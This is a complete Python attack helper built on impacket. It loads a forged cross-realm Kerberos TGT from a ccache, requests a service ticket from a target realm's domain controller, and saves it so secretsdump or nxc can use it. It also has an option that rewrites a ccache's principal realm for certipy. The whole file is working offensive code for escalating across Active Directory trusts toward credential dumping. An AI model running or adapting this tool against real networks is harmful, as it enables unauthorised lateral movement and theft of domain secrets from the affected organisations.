#!/usr/bin/env python3
"""Request a TGS using a cross-realm (inter-realm) TGT.

Workaround for impacket #315: getST/SMB cross-realm referral is broken because
``CCache.parseFile`` and ``getST.run`` only look up ``krbtgt/<DOMAIN>@<DOMAIN>``
(a regular intra-realm TGT) when ``-k -no-pass`` is given. A forged inter-realm
TGT has server ``krbtgt/<TARGET>@<SOURCE>``, so it is silently ignored and
getST falls through to a no-pass authentication that fails with
``KDC_ERR_WRONG_REALM`` (and exit 0, hiding the failure).

This helper loads the cross-realm TGT directly out of the input ccache, calls
``getKerberosTGS`` against the target realm's KDC, and writes the resulting TGS
to a new ccache that ``nxc`` / ``secretsdump`` consume via ``KRB5CCNAME``.

``--rehome-realm`` rewrites only the ccache header principal's realm, leaving
every ticket untouched.
"""

import argparse
import sys

from impacket.krb5 import constants
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGS
from impacket.krb5.types import Principal


def rehome(in_ccache: str, out_ccache: str, realm: str) -> int:
    """Copy `in_ccache` to `out_ccache` with the header principal realm set to `realm`."""
    cc = CCache.loadFile(in_ccache)
    if cc is None:
        print(f"[!] failed to load {in_ccache}", file=sys.stderr)
        return 2
    if not cc.principal:
        print(f"[!] no principal in {in_ccache}", file=sys.stderr)
        return 3
    cc.principal.realm["data"] = realm.encode()
    cc.principal.realm["length"] = len(realm)
    cc.saveFile(out_ccache)
    print(f"[+] re-homed ccache principal realm to {realm} at {out_ccache}", file=sys.stderr)
    return 0


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--in-ccache", required=True, help="ccache containing the cross-realm TGT")
    p.add_argument("--out-ccache", required=True, help="ccache to write resulting TGS to")
    p.add_argument("--spn", help="service SPN, e.g. cifs/dc.target.local")
    p.add_argument("--source-realm", help="realm where the TGT was issued")
    p.add_argument("--target-realm", required=True, help="realm of the SPN")
    p.add_argument("--target-kdc", help="target realm KDC IP/host to send TGS-REQ to")
    p.add_argument(
        "--append",
        action="store_true",
        help="if --out-ccache exists, load it and merge the new TGS into it (preserves the inter-realm TGT and any prior service tickets)",
    )
    p.add_argument(
        "--rehome-realm",
        action="store_true",
        help="skip the TGS request; just copy --in-ccache to --out-ccache with the header principal realm set to --target-realm (certipy consumability)",
    )
    args = p.parse_args()

    src_realm = (args.source_realm or "").upper()
    tgt_realm = args.target_realm.upper()

    if args.rehome_realm:
        return rehome(args.in_ccache, args.out_ccache, tgt_realm)

    for required in ("spn", "source_realm", "target_kdc"):
        if not getattr(args, required):
            p.error(f"--{required.replace('_', '-')} is required without --rehome-realm")

    in_cc = CCache.loadFile(args.in_ccache)
    if in_cc is None:
        print(f"[!] failed to load {args.in_ccache}", file=sys.stderr)
        return 2

    cross_principal = f"krbtgt/{tgt_realm}@{src_realm}"
    creds = in_cc.getCredential(cross_principal, anySPN=False)
    if creds is None:
        print(f"[!] no cross-realm TGT for {cross_principal} in {args.in_ccache}", file=sys.stderr)
        return 3

    tgt = creds.toTGT()
    server = Principal(args.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)

    print(
        f"[*] requesting TGS for {args.spn} from {args.target_kdc} ({tgt_realm})",
        file=sys.stderr,
    )
    # getKerberosTGS returns (tgs_rep, cipher, tgt_session_key, new_session_key).
    # tgt_session_key decrypts the TGS-REP enc-part (key usage 8); new_session_key
    # is the application key inside the TGS. fromTGS expects (tgs, oldKey, newKey).
    tgs, _cipher, tgt_session_key, new_session_key = getKerberosTGS(
        server,
        tgt_realm,
        args.target_kdc,
        tgt["KDC_REP"],
        tgt["cipher"],
        tgt["sessionKey"],
    )

    import os
    if args.append and os.path.exists(args.out_ccache):
        out = CCache.loadFile(args.out_ccache) or CCache()
        scratch = CCache()
        scratch.fromTGS(tgs, tgt_session_key, new_session_key)
        for cred in scratch.credentials:
            out.credentials.append(cred)
        if out.principal is None and scratch.principal is not None:
            out.principal = scratch.principal
        out.saveFile(args.out_ccache)
    else:
        out = CCache()
        out.fromTGS(tgs, tgt_session_key, new_session_key)
        out.saveFile(args.out_ccache)
    print(f"[+] wrote TGS to {args.out_ccache}", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
